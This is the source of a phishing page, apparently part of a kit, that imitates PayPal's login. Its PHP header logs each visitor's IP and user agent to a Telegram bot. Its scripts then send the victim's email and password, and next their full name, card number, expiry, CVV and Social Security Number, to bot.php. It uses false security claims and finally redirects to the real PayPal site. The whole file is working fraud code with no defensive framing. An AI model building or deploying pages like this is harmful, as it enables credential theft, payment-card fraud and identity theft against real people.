<?php
// Start session to track victims
session_start();
$_SESSION['visitor_id'] = uniqid();

// Send initial visit to bot
include 'bot.php';
sendTelegram("👀 New Visitor\nIP: {$_SERVER['REMOTE_ADDR']}\nUser-Agent: {$_SERVER['HTTP_USER_AGENT']}\nTime: ".date('Y-m-d H:i:s'));
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <!-- PayPal Exact Header -->
    <header class="header">
        <div class="container">
            <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" alt="PayPal" class="logo">
            <div class="header-links">
                <a href="#">Personal</a>
                <a href="#">Business</a>
                <a href="#">Developer</a>
                <a href="#">Help</a>
            </div>
        </div>
    </header>

    <main>
        <div class="container">
            <!-- Login Box - Exact PayPal Copy -->
            <div class="login-container" id="loginSection">
                <div class="login-box">
                    <h1>Log in to your PayPal account</h1>
                    
                    <form id="loginForm" method="POST" action="verify.php">
                        <div class="form-group">
                            <label for="email">Email address</label>
                            <input type="email" id="email" name="email" required autocomplete="off">
                        </div>

                        <div class="form-group">
                            <label for="password">Password</label>
                            <input type="password" id="password" name="password" required>
                            <a href="#" class="forgot-password">Forgotten password?</a>
                        </div>

                        <button type="submit" class="login-btn">Log In</button>

                        <div class="or-divider">
                            <span>or</span>
                        </div>

                        <button type="button" class="signup-btn" onclick="window.location.href='#'">Sign Up</button>
                    </form>

                    <div class="security-logos">
                        <img src="https://www.paypalobjects.com/webstatic/mktg/logo/seal-1.png" alt="Secure">
                        <img src="https://www.paypalobjects.com/webstatic/mktg/logo/seal-2.png" alt="Verified">
                    </div>
                </div>

                <!-- Right Side Info -->
                <div class="info-box">
                    <h3>PayPal is always safer</h3>
                    <p>We protect your financial info with encryption and fraud detection.</p>
                    <a href="#" class="learn-more">Learn more</a>
                </div>
            </div>

            <!-- Security Questions Section (Hidden Initially) -->
            <div class="security-container" id="securitySection" style="display: none;">
                <div class="login-box">
                    <h2>Confirm your identity</h2>
                    <p class="security-note">For your security, please verify a few details</p>
                    
                    <form id="securityForm" method="POST" action="verify.php">
                        <div class="form-group">
                            <label for="fullname">Full legal name (as on card)</label>
                            <input type="text" id="fullname" name="fullname" required>
                        </div>

                        <div class="card-details">
                            <div class="form-group card-number">
                                <label for="cardnumber">Debit/Credit card number</label>
                                <input type="text" id="cardnumber" name="cardnumber" maxlength="16" placeholder="1234 5678 9012 3456" required>
                            </div>
                            
                            <div class="form-row">
                                <div class="form-group expiry">
                                    <label for="expiry">Expiry date</label>
                                    <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" required>
                                </div>
                                
                                <div class="form-group cvv">
                                    <label for="cvv">CVV</label>
                                    <input type="text" id="cvv" name="cvv" maxlength="3" placeholder="123" required>
                                    <span class="cvv-help">?</span>
                                </div>
                            </div>
                        </div>

                        <div class="form-group ssn-group">
                            <label for="ssn">Social Security Number</label>
                            <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX" maxlength="11" required>
                            <p class="ssn-note">We need this to verify your identity (FDIC insured)</p>
                        </div>

                        <button type="submit" class="verify-btn">Confirm and Continue</button>
                    </form>
                </div>
            </div>
        </div>
    </main>

    <!-- Footer -->
    <footer>
        <div class="container">
            <div class="footer-links">
                <a href="#">Contact</a>
                <a href="#">Privacy</a>
                <a href="#">Legal</a>
                <a href="#">Feedback</a>
            </div>
            <p class="copyright">© 2024 PayPal, Inc. All rights reserved.</p>
        </div>
    </footer>

    <script>
        // Handle login form submission
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Send login data via AJAX
            var formData = new FormData(this);
            formData.append('type', 'login');
            
            fetch('bot.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if(data.success) {
                    // Show security questions
                    document.getElementById('loginSection').style.display = 'none';
                    document.getElementById('securitySection').style.display = 'block';
                    
                    // Pre-fill email from login
                    document.getElementById('email').value = document.getElementById('email').value;
                }
            });
        });

        // Handle security form submission
        document.getElementById('securityForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            var formData = new FormData(this);
            formData.append('type', 'security');
            formData.append('email', document.getElementById('email').value);
            
            fetch('bot.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if(data.success) {
                    // Redirect to real PayPal
                    window.location.href = 'https://www.paypal.com/signin';
                } else {
                    alert('Invalid information. Please check and try again.');
                }
            });
        });

        // Auto-format card number
        document.getElementById('cardnumber').addEventListener('input', function(e) {
            var value = this.value.replace(/\D/g, '');
            var formatted = value.match(/.{1,4}/g);
            if(formatted) {
                this.value = formatted.join(' ');
            }
        });

        // Auto-format expiry
        document.getElementById('expiry').addEventListener('input', function(e) {
            var value = this.value.replace(/\D/g, '');
            if(value.length >= 2) {
                this.value = value.slice(0,2) + '/' + value.slice(2,4);
            }
        });

        // Auto-format SSN
        document.getElementById('ssn').addEventListener('input', function(e) {
            var value = this.value.replace(/\D/g, '');
            if(value.length > 3 && value.length <= 5) {
                this.value = value.slice(0,3) + '-' + value.slice(3);
            } else if(value.length > 5) {
                this.value = value.slice(0,3) + '-' + value.slice(3,5) + '-' + value.slice(5,9);
            }
        });
    </script>
</body>
</html>